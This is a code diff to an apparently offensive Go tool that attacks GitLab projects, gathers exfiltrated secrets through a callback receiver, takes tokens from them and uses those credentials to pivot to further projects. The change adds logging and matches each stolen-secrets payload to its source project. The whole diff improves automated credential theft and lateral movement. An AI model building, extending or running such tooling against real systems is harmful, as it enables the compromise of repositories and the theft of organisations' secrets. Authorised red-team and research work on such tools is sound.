@@ -6,6 +6,7 @@ import (
 	"crypto/x509"
 	"encoding/pem"
 	"fmt"
+	"log/slog"
 	"os"
 	"strings"
 	"sync"
@@ -118,6 +119,7 @@ func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
 	credQueue := []*Credential{initialCred}
 	var totalAttacked int32
 
+	slog.Info("pivot loop starting", "max_depth", o.opts.MaxDepth, "targets", len(o.opts.InitialTargets), "dry_run", o.opts.DryRun)
 	for depth := 0; depth < o.opts.MaxDepth && len(credQueue) > 0; depth++ {
 		o.emit(PivotEvent{Type: "depth_start", Depth: depth, Message: fmt.Sprintf("starting depth %d with %d credential(s)", depth, len(credQueue))})
 		nextQueue := o.processDepth(ctx, credQueue, pubPEM, depth, &totalAttacked)
@@ -137,6 +139,7 @@ func (o *Orchestrator) Run(ctx context.Context) (*PivotStats, error) {
 	o.stats.CredentialsValid = validCount
 	o.stats.Correlations = CorrelateCredentials(o.creds)
 	o.stats.Duration = time.Since(start)
+	slog.Info("pivot loop complete", "depth_reached", o.stats.MaxDepthReached, "attacked", o.stats.ProjectsAttacked, "credentials_found", o.stats.CredentialsFound, "valid", o.stats.CredentialsValid, "duration", o.stats.Duration)
 	return &o.stats, nil
 }
 
@@ -223,14 +226,22 @@ func (o *Orchestrator) attackAndHarvest(ctx context.Context, cl *gitlabx.Client,
 	// Phase 2: Batch-receive all callbacks with a single deadline.
 	payloads, _ := o.callback.ReceiveAll(ctx, o.opts.ReceiveTimeout, len(attacked))
 
-	// Process received payloads. Payloads carry no target correlation, so
-	// exfil data is attributed by arrival order (best-effort). Token
-	// extraction works regardless of source attribution.
+	// Build lookup from project path to target for correlation.
+	pathIndex := make(map[string]ExploitableTarget, len(attacked))
+	for _, at := range attacked {
+		pathIndex[at.target.Path] = at.target
+	}
+
+	slog.Debug("processing callbacks", "received", len(payloads), "expected", len(attacked))
 	var harvested []*Credential
 	for i, payload := range payloads {
-		target := attacked[0].target
-		if i < len(attacked) {
+		var target ExploitableTarget
+		if t, ok := pathIndex[payload.Project]; ok {
+			target = t
+		} else if i < len(attacked) {
 			target = attacked[i].target
+		} else {
+			target = attacked[0].target
 		}
 		o.storeExfilData(payload.Secrets, target, depth)
 		harvested = append(harvested, o.harvestTokens(ctx, payload, target, depth)...)
